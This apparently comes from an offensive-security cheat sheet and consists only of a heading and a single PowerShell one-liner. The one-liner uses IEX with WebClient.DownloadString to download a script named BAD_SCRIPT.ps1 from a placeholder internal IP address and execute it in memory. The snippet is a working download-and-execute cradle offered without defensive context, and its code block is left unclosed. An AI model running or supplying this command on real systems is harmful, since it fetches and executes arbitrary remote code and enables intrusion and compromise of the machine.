# Load and execute a remote script from HTTP
```powershell
IEX ((New-Object System.Net.WebClient).DownloadString("http://10.X.X.X/BAD_SCRIPT.ps1"))
